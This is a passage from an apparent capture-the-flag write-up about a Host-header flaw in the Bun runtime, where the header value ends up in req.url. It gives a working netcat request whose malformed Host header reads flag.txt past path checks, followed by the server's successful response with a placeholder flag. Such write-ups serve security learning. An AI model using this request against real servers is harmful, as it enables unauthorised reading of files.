n this challenge, the key vulnerability lies in how Bun handles the Host header, which is then inserted into req.url. This opens the door for bypassing checks and performing unexpected actions.
Step-by-Step Solution:

    Understanding the Vulnerability: The Host header value is placed into req.url, which allows us to manipulate the URL in creative ways. This means we can use a malicious Host header to craft requests that bypass checks and access resources like flag.txt.

    Exploiting the Vulnerability: You can send a specially crafted HTTP request to the target server, using netcat (nc) to simulate the HTTP request. The key is the malformed Host header that contains the path to the flag:

printf 'GET /.. HTTP/1.0\r\nHost: fakehost/fla\tg.txt\r\n\r\n' | nc -n 127.0.0.1 9090     
   

This results in a successful HTTP response:

HTTP/1.1 200 OK
Content-Type: text/plain;charset=utf-8
Date: Fri, 29 Aug 2025 12:25:40 GMT
Date: Fri, 29 Aug 2025 12:25:40 GMT
Content-Length: 14

CSL{fake_flag}   


